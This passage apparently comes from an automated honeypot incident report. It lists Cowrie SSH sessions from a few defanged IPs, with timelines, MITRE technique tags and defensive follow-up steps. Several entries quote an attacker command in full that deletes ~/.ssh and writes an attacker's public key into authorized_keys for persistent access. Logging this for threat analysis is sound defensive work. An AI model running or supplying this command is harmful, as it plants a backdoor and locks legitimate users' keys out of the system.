**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:44:53` | `cowrie.session.connect` |
| `2026-05-01 21:44:53` | `cowrie.client.version` |
| `2026-05-01 21:44:54` | `cowrie.client.kex` |
| `2026-05-01 21:44:55` | `cowrie.login.success` |
| `2026-05-01 21:44:56` | `cowrie.session.params` |
| `2026-05-01 21:44:56` | `cowrie.command.input` |
| `2026-05-01 21:44:56` | `cowrie.command.failed` |
| `2026-05-01 21:44:56` | `cowrie.log.closed` |
| `2026-05-01 21:44:57` | `cowrie.session.params` |
| `2026-05-01 21:44:57` | `cowrie.command.input` |
| `2026-05-01 21:44:57` | `cowrie.session.file_download` |
| `2026-05-01 21:44:57` | `cowrie.log.closed` |
| `2026-05-01 21:45:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]169` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42cdbce5d413

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]169` |
| **First Seen** | 2026-05-01 21:45 |
| **Last Seen** | 2026-05-01 21:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:45:01` | `cowrie.session.connect` |
| `2026-05-01 21:45:01` | `cowrie.client.version` |
| `2026-05-01 21:45:01` | `cowrie.client.kex` |
| `2026-05-01 21:45:03` | `cowrie.login.success` |
| `2026-05-01 21:45:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]169` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-229d642271b0

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]70` |
| **First Seen** | 2026-05-01 21:45 |
| **Last Seen** | 2026-05-01 21:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:45:03` | `cowrie.session.connect` |
| `2026-05-01 21:45:03` | `cowrie.client.version` |
| `2026-05-01 21:45:03` | `cowrie.client.kex` |
| `2026-05-01 21:45:05` | `cowrie.login.success` |
| `2026-05-01 21:45:05` | `cowrie.session.params` |
| `2026-05-01 21:45:05` | `cowrie.command.input` |
| `2026-05-01 21:45:05` | `cowrie.command.failed` |
| `2026-05-01 21:45:06` | `cowrie.log.closed` |
| `2026-05-01 21:45:06` | `cowrie.session.params` |
| `2026-05-01 21:45:06` | `cowrie.command.input` |
| `2026-05-01 21:45:07` | `cowrie.session.file_download` |
| `2026-05-01 21:45:07` | `cowrie.log.closed` |
| `2026-05-01 21:45:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]70` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26a95f2d4595

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]70` |
| **First Seen** | 2026-05-01 21:45 |
| **Last Seen** | 2026-05-01 21:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:45:10` | `cowrie.session.connect` |
| `2026-05-01 21:45:10` | `cowrie.client.version` |
| `2026-05-01 21:45:11` | `cowrie.client.kex` |
| `2026-05-01 21:45:12` | `cowrie.login.success` |
| `2026-05-01 21:45:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]70` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0a19752f761

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]70` |
| **First Seen** | 2026-05-01 21:47 |
| **Last Seen** | 2026-05-01 21:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:47:40` | `cowrie.session.connect` |
| `2026-05-01 21:47:40` | `cowrie.client.version` |
| `2026-05-01 21:47:40` | `cowrie.client.kex` |
| `2026-05-01 21:47:42` | `cowrie.login.success` |
| `2026-05-01 21:47:42` | `cowrie.session.params` |
| `2026-05-01 21:47:42` | `cowrie.command.input` |
| `2026-05-01 21:47:42` | `cowrie.command.failed` |
| `2026-05-01 21:47:43` | `cowrie.log.closed` |
| `2026-05-01 21:47:43` | `cowrie.session.params` |
| `2026-05-01 21:47:43` | `cowrie.command.input` |
| `2026-05-01 21:47:44` | `cowrie.session.file_download` |
| `2026-05-01 21:47:44` | `cowrie.log.closed` |
| `2026-05-01 21:47:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]70` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e8c06cbee53

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]70` |
| **First Seen** | 2026-05-01 21:47 |
| **Last Seen** | 2026-05-01 21:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:47:47` | `cowrie.session.connect` |
| `2026-05-01 21:47:47` | `cowrie.client.version` |
| `2026-05-01 21:47:47` | `cowrie.client.kex` |
| `2026-05-01 21:47:49` | `cowrie.login.success` |
| `2026-05-01 21:47:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]70` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a193e4c2c73d

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]70` |
| **First Seen** | 2026-05-01 21:50 |
| **Last Seen** | 2026-05-01 21:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:50:24` | `cowrie.session.connect` |
| `2026-05-01 21:50:24` | `cowrie.client.version` |
| `2026-05-01 21:50:24` | `cowrie.client.kex` |
| `2026-05-01 21:50:25` | `cowrie.login.success` |
| `2026-05-01 21:50:26` | `cowrie.session.params` |
| `2026-05-01 21:50:26` | `cowrie.command.input` |
| `2026-05-01 21:50:26` | `cowrie.command.failed` |
| `2026-05-01 21:50:26` | `cowrie.log.closed` |
| `2026-05-01 21:50:27` | `cowrie.session.params` |
| `2026-05-01 21:50:27` | `cowrie.command.input` |
| `2026-05-01 21:50:27` | `cowrie.session.file_download` |
| `2026-05-01 21:50:27` | `cowrie.log.closed` |
| `2026-05-01 21:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]70` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37276c26c1fb

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]70` |
| **First Seen** | 2026-05-01 21:50 |
| **Last Seen** | 2026-05-01 21:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:50:31` | `cowrie.session.connect` |
| `2026-05-01 21:50:31` | `cowrie.client.version` |
| `2026-05-01 21:50:31` | `cowrie.client.kex` |
| `2026-05-01 21:50:33` | `cowrie.login.success` |
| `2026-05-01 21:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]70` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6537b339330

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]70` |
| **First Seen** | 2026-05-01 21:51 |
| **Last Seen** | 2026-05-01 21:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:51:17` | `cowrie.session.connect` |
| `2026-05-01 21:51:17` | `cowrie.client.version` |
| `2026-05-01 21:51:17` | `cowrie.client.kex` |
| `2026-05-01 21:51:18` | `cowrie.login.success` |
| `2026-05-01 21:51:19` | `cowrie.session.params` |
| `2026-05-01 21:51:19` | `cowrie.command.input` |
| `2026-05-01 21:51:19` | `cowrie.command.failed` |
| `2026-05-01 21:51:19` | `cowrie.log.closed` |
| `2026-05-01 21:51:20` | `cowrie.session.params` |
| `2026-05-01 21:51:20` | `cowrie.command.input` |
| `2026-05-01 21:51:20` | `cowrie.session.file_download` |
| `2026-05-01 21:51:20` | `cowrie.log.closed` |
| `2026-05-01 21:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]70` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc8a01151a7e

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]70` |
| **First Seen** | 2026-05-01 21:51 |
| **Last Seen** | 2026-05-01 21:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:51:24` | `cowrie.session.connect` |
| `2026-05-01 21:51:24` | `cowrie.client.version` |
| `2026-05-01 21:51:24` | `cowrie.client.kex` |
| `2026-05-01 21:51:25` | `cowrie.login.success` |
| `2026-05-01 21:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]70` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-595118dbfd66

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]70` |
| **First Seen** | 2026-05-01 21:53 |
| **Last Seen** | 2026-05-01 21:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:53:58` | `cowrie.session.connect` |
| `2026-05-01 21:53:58` | `cowrie.client.version` |
| `2026-05-01 21:53:58` | `cowrie.client.kex` |
| `2026-05-01 21:54:00` | `cowrie.login.success` |
| `2026-05-01 21:54:00` | `cowrie.session.params` |
| `2026-05-01 21:54:00` | `cowrie.command.input` |
| `2026-05-01 21:54:00` | `cowrie.command.failed` |
| `2026-05-01 21:54:01` | `cowrie.log.closed` |
| `2026-05-01 21:54:01` | `cowrie.session.params` |
| `2026-05-01 21:54:01` | `cowrie.command.input` |
| `2026-05-01 21:54:02` | `cowrie.session.file_download` |
| `2026-05-01 21:54:02` | `cowrie.log.closed` |
| `2026-05-01 21:54:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]70` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9512d88aef1c

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]70` |
| **First Seen** | 2026-05-01 21:54 |
| **Last Seen** | 2026-05-01 21:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 21:54:05` | `cowrie.session.connect` |
| `2026-05-01 21:54:05` | `cowrie.client.version` |
| `2026-05-01 21:54:06` | `cowrie.client.kex` |
| `2026-05-01 21:54:07` | `cowrie.login.success` |
| `2026-05-01 21:54:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]70` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5476bcae9781

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:04 |
| **Last Seen** | 2026-05-01 22:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:04:49` | `cowrie.session.connect` |
| `2026-05-01 22:04:49` | `cowrie.client.version` |
| `2026-05-01 22:04:50` | `cowrie.client.kex` |
| `2026-05-01 22:04:51` | `cowrie.login.success` |
| `2026-05-01 22:04:52` | `cowrie.session.params` |
| `2026-05-01 22:04:52` | `cowrie.command.input` |
| `2026-05-01 22:04:52` | `cowrie.command.failed` |
| `2026-05-01 22:04:52` | `cowrie.log.closed` |
| `2026-05-01 22:04:53` | `cowrie.session.params` |
| `2026-05-01 22:04:53` | `cowrie.command.input` |
| `2026-05-01 22:04:53` | `cowrie.session.file_download` |
| `2026-05-01 22:04:53` | `cowrie.log.closed` |
| `2026-05-01 22:04:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c518cac0a236

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]70` |
| **First Seen** | 2026-05-01 22:04 |
| **Last Seen** | 2026-05-01 22:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:04:53` | `cowrie.session.connect` |
| `2026-05-01 22:04:53` | `cowrie.client.version` |
| `2026-05-01 22:04:53` | `cowrie.client.kex` |
| `2026-05-01 22:04:54` | `cowrie.login.success` |
| `2026-05-01 22:04:55` | `cowrie.session.params` |
| `2026-05-01 22:04:55` | `cowrie.command.input` |
| `2026-05-01 22:04:55` | `cowrie.command.failed` |
| `2026-05-01 22:04:55` | `cowrie.log.closed` |
| `2026-05-01 22:04:56` | `cowrie.session.params` |
| `2026-05-01 22:04:56` | `cowrie.command.input` |
| `2026-05-01 22:04:56` | `cowrie.session.file_download` |
| `2026-05-01 22:04:56` | `cowrie.log.closed` |
| `2026-05-01 22:05:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]70` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-febaa6597ee1

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:04 |
| **Last Seen** | 2026-05-01 22:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:04:56` | `cowrie.session.connect` |
| `2026-05-01 22:04:56` | `cowrie.client.version` |
| `2026-05-01 22:04:57` | `cowrie.client.kex` |
| `2026-05-01 22:04:58` | `cowrie.login.success` |
| `2026-05-01 22:04:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59a272e87c38

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]70` |
| **First Seen** | 2026-05-01 22:05 |
| **Last Seen** | 2026-05-01 22:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:05:00` | `cowrie.session.connect` |
| `2026-05-01 22:05:00` | `cowrie.client.version` |
| `2026-05-01 22:05:00` | `cowrie.client.kex` |
| `2026-05-01 22:05:02` | `cowrie.login.success` |
| `2026-05-01 22:05:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]70` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-475d720cf1f4

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]243` |
| **First Seen** | 2026-05-01 22:06 |
| **Last Seen** | 2026-05-01 22:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:06:05` | `cowrie.session.connect` |
| `2026-05-01 22:06:05` | `cowrie.client.version` |
| `2026-05-01 22:06:05` | `cowrie.client.kex` |
| `2026-05-01 22:06:07` | `cowrie.login.success` |
| `2026-05-01 22:06:07` | `cowrie.session.params` |
| `2026-05-01 22:06:07` | `cowrie.command.input` |
| `2026-05-01 22:06:07` | `cowrie.command.failed` |
| `2026-05-01 22:06:07` | `cowrie.log.closed` |
| `2026-05-01 22:06:08` | `cowrie.session.params` |
| `2026-05-01 22:06:08` | `cowrie.command.input` |
| `2026-05-01 22:06:09` | `cowrie.session.file_download` |
| `2026-05-01 22:06:09` | `cowrie.log.closed` |
| `2026-05-01 22:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]243` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06064022a67a

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:06 |
| **Last Seen** | 2026-05-01 22:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:06:12` | `cowrie.session.connect` |
| `2026-05-01 22:06:12` | `cowrie.client.version` |
| `2026-05-01 22:06:12` | `cowrie.client.kex` |
